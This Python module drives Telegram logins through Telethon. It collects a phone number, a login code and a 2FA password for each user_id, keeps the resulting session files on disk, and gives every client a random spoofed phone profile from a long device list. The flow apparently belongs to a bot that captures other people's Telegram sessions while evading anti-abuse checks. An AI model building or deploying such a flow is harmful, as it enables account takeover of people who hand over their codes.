import asyncio
import logging
import time
import random
from typing import Dict, Any
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, PhoneCodeExpiredError
from config import config
from utils import sanitize_log_input

class AuthManager:
    def __init__(self):
        self.pending_auth = {}
        self.active_clients = {}
        self.client_loops = {}
        self.devices = [
            {"model": "Samsung SM-G973F", "system": "Android 10", "version": "8.4.1"},
            {"model": "Samsung SM-G975F", "system": "Android 11", "version": "8.5.0"},
            {"model": "Samsung SM-G981B", "system": "Android 11", "version": "8.5.1"},
            {"model": "Samsung SM-G991B", "system": "Android 12", "version": "8.6.1"},
            {"model": "Samsung SM-A525F", "system": "Android 11", "version": "8.5.4"},
            {"model": "Samsung SM-N975F", "system": "Android 10", "version": "8.4.3"},
            {"model": "Samsung SM-G996B", "system": "Android 12", "version": "8.6.4"},
            {"model": "Samsung SM-G998B", "system": "Android 13", "version": "8.7.2"},
            {"model": "Xiaomi Mi 11", "system": "Android 11", "version": "8.5.2"},
            {"model": "Xiaomi Mi 12", "system": "Android 12", "version": "8.6.5"},
            {"model": "Xiaomi Redmi Note 10", "system": "Android 11", "version": "8.5.5"},
            {"model": "Xiaomi POCO F3", "system": "Android 11", "version": "8.5.6"},
            {"model": "Xiaomi Mi 10T Pro", "system": "Android 10", "version": "8.4.4"},
            {"model": "OnePlus 9 Pro", "system": "Android 12", "version": "8.6.0"},
            {"model": "OnePlus 8T", "system": "Android 11", "version": "8.5.7"},
            {"model": "OnePlus Nord 2", "system": "Android 11", "version": "8.5.8"},
            {"model": "OnePlus 10 Pro", "system": "Android 13", "version": "8.7.3"},
            {"model": "Google Pixel 6", "system": "Android 13", "version": "8.7.1"},
            {"model": "Google Pixel 5", "system": "Android 12", "version": "8.6.8"},
            {"model": "Google Pixel 4a", "system": "Android 11", "version": "8.5.8"},
            {"model": "Google Pixel 7", "system": "Android 13", "version": "8.7.4"},
            {"model": "Huawei P40 Pro", "system": "Android 10", "version": "8.4.2"},
            {"model": "Huawei Mate 40", "system": "Android 10", "version": "8.4.4"},
            {"model": "Huawei P30 Pro", "system": "Android 9", "version": "8.3.5"},
            {"model": "Oppo Find X3", "system": "Android 11", "version": "8.5.1"},
            {"model": "Oppo Reno 6", "system": "Android 11", "version": "8.5.9"},
            {"model": "Oppo A74", "system": "Android 11", "version": "8.5.10"},
            {"model": "Oppo Find X5", "system": "Android 12", "version": "8.6.9"},
            {"model": "Vivo X60 Pro", "system": "Android 11", "version": "8.5.2"},
            {"model": "Vivo V21", "system": "Android 11", "version": "8.5.11"},
            {"model": "Vivo Y20s", "system": "Android 10", "version": "8.4.6"},
            {"model": "Vivo X70 Pro", "system": "Android 12", "version": "8.6.10"},
            {"model": "Realme GT", "system": "Android 11", "version": "8.5.3"},
            {"model": "Realme 8 Pro", "system": "Android 11", "version": "8.5.12"},
            {"model": "Realme X7 Max", "system": "Android 11", "version": "8.5.13"},
            {"model": "Realme GT Neo", "system": "Android 11", "version": "8.5.11"},
            {"model": "Sony Xperia 1 III", "system": "Android 11", "version": "8.5.3"},
            {"model": "Sony Xperia 5 II", "system": "Android 10", "version": "8.4.14"},
            {"model": "Sony Xperia 10 III", "system": "Android 11", "version": "8.5.15"},
            {"model": "Motorola Edge 20", "system": "Android 11", "version": "8.5.16"},
            {"model": "Motorola G100", "system": "Android 11", "version": "8.5.17"},
            {"model": "Nokia 8.3", "system": "Android 10", "version": "8.4.18"},
            {"model": "Samsung SM-S918B", "system": "Android 14", "version": "10.2.1"},
            {"model": "Samsung SM-S928B", "system": "Android 14", "version": "10.2.2"},
            {"model": "Samsung SM-S938B", "system": "Android 14", "version": "10.2.3"},
            {"model": "Google Pixel 8", "system": "Android 14", "version": "10.2.4"},
            {"model": "Google Pixel 8 Pro", "system": "Android 14", "version": "10.2.5"},
            {"model": "Google Pixel 9", "system": "Android 15", "version": "11.0.1"},
            {"model": "Google Pixel 9 Pro", "system": "Android 15", "version": "11.0.2"},
            {"model": "OnePlus 12", "system": "Android 14", "version": "10.2.6"},
            {"model": "OnePlus 12 Pro", "system": "Android 14", "version": "10.2.7"},
            {"model": "Xiaomi 14", "system": "Android 14", "version": "10.2.8"},
            {"model": "Xiaomi 14 Pro", "system": "Android 14", "version": "10.2.9"},
            {"model": "Xiaomi 15", "system": "Android 15", "version": "11.0.3"},
            {"model": "Xiaomi 15 Pro", "system": "Android 15", "version": "11.0.4"},
            {"model": "Oppo Find X7", "system": "Android 14", "version": "10.2.10"},
            {"model": "Oppo Find X7 Pro", "system": "Android 14", "version": "10.2.11"},
            {"model": "Vivo X100", "system": "Android 14", "version": "10.2.12"},
            {"model": "Vivo X100 Pro", "system": "Android 14", "version": "10.2.13"},
            {"model": "Realme GT5", "system": "Android 14", "version": "10.2.14"},
            {"model": "Realme GT5 Pro", "system": "Android 14", "version": "10.2.15"},
            {"model": "Nothing Phone 2", "system": "Android 14", "version": "10.2.16"},
            {"model": "Sony Xperia 1 V", "system": "Android 14", "version": "10.2.17"},
            {"model": "Motorola Edge 40", "system": "Android 14", "version": "10.2.18"}
        ]
    
    def get_random_device(self):
        return random.choice(self.devices)

    def start_phone_auth(self, user_id: int, phone: str) -> Dict[str, Any]:
        try:
            phone = str(phone)
            phone_digits = ''.join(ch for ch in phone if ch.isdigit())
            
            session_name = f"auth_{user_id}_{phone_digits}"
            session_path = f"sessions/{session_name}.session"
            
            api_id = int(config.get('api_id'))
            api_hash = config.get('api_hash')
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            device = self.get_random_device()
            client = TelegramClient(
                session_path, 
                api_id, 
                api_hash,
                device_model=device["model"],
                system_version=device["system"],
                app_version=device["version"],
                lang_code="en",
                system_lang_code="en",
                flood_sleep_threshold=0,
                auto_reconnect=False
            )
            
            loop.run_until_complete(client.connect())
            sent_code = loop.run_until_complete(client.send_code_request(phone))
            
            # Store client and loop for reuse
            self.active_clients[user_id] = client
            self.client_loops[user_id] = loop
            
            self.pending_auth[user_id] = {
                'phone': phone,
                'phone_code_hash': sent_code.phone_code_hash,
                'session_path': session_path,
                'session_name': session_name,
                'step': 'code',
                'request_time': time.time()
            }
            
            return {
                'success': True,
                'step': 'code',
                'message': f'Code sent to {phone}. Please enter the verification code.'
            }
                
        except Exception as e:
            logging.error(f"Phone auth error: {e}")
            return {'success': False, 'error': str(e)}

    def verify_code(self, user_id: int, code: str) -> Dict[str, Any]:
        if user_id not in self.pending_auth:
            return {'success': False, 'error': 'No pending authentication'}
        
        try:
            auth_data = self.pending_auth[user_id]
            
            # Check if enough time has passed since code request (minimum 10 seconds)
            time_since_request = time.time() - auth_data.get('request_time', 0)
            if time_since_request < 10:
                wait_time = int(10 - time_since_request)
                return {'success': False, 'error': f'Please wait {wait_time} more seconds before entering the code'}
            
            # Reuse existing client and loop
            if user_id not in self.active_clients:
                return {'success': False, 'error': 'Client session lost. Please restart authentication.'}
            
            client = self.active_clients[user_id]
            loop = self.client_loops[user_id]
            
            try:
                result = loop.run_until_complete(client.sign_in(
                    phone=auth_data['phone'],
                    code=code,
                    phone_code_hash=auth_data['phone_code_hash']
                ))
                
                me = loop.run_until_complete(client.get_me())
                
                # Clean up
                self._cleanup_client(user_id)
                
                return {
                    'success': True,
                    'step': 'complete',
                    'user_info': {
                        'id': me.id,
                        'name': f"{me.first_name or ''} {me.last_name or ''}".strip(),
                        'username': me.username,
                        'phone': me.phone
                    }
                }
            except Exception as e:
                # Don't cleanup on error, allow retry
                raise e
                
        except SessionPasswordNeededError:
            auth_data['step'] = '2fa'
            return {'success': True, 'step': '2fa', 'message': 'Enter 2FA password'}
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except PhoneCodeExpiredError:
            self.cancel_auth(user_id)
            return {'success': False, 'error': 'The confirmation code has expired', 'expired': True}
        except Exception as e:
            error_msg = str(e).lower()
            if 'expired' in error_msg or 'timeout' in error_msg or 'previously shared' in error_msg:
                self.cancel_auth(user_id)
                return {'success': False, 'error': 'Code expired or already used. Please request a new code.', 'expired': True}
            logging.error(f"Code verify error: {e}")
            return {'success': False, 'error': str(e)}

    def verify_2fa(self, user_id: int, password: str) -> Dict[str, Any]:
        if user_id not in self.pending_auth or user_id not in self.active_clients:
            return {'success': False, 'error': 'No pending authentication or client session lost.'}
        
        try:
            client = self.active_clients[user_id]
            loop = self.client_loops[user_id]
            
            loop.run_until_complete(client.sign_in(password=password))
            
            me = loop.run_until_complete(client.get_me())
            
            self._cleanup_client(user_id)
            
            return {
                'success': True,
                'step': 'complete',
                'user_info': {
                    'id': me.id,
                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip(),
                    'username': me.username,
                    'phone': me.phone
                }
            }
                
        except PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            logging.error(f"2FA verify error: {e}")
            return {'success': False, 'error': str(e)}

    def _cleanup_client(self, user_id: int):
        """Clean up client and loop resources"""
        if user_id in self.active_clients:
            try:
                client = self.active_clients[user_id]
                loop = self.client_loops[user_id]
                loop.run_until_complete(client.disconnect())
                loop.close()
            except:
                pass
            self.active_clients.pop(user_id, None)
            self.client_loops.pop(user_id, None)
        self.pending_auth.pop(user_id, None)
    
    def cancel_auth(self, user_id: int) -> bool:
        if user_id in self.pending_auth:
            auth_data = self.pending_auth[user_id]
            try:
                import os
                if os.path.exists(auth_data['session_path']):
                    os.remove(auth_data['session_path'])
            except:
                pass
            self._cleanup_client(user_id)
            return True
        return False
    
    def resend_code(self, user_id: int) -> Dict[str, Any]:
        if user_id not in self.pending_auth:
            return {'success': False, 'error': 'No pending authentication'}
        
        auth_data = self.pending_auth[user_id]
        phone = auth_data['phone']
        
        # Cancel current auth and start fresh
        self.cancel_auth(user_id)
        return self.start_phone_auth(user_id, phone)

auth_manager = AuthManager()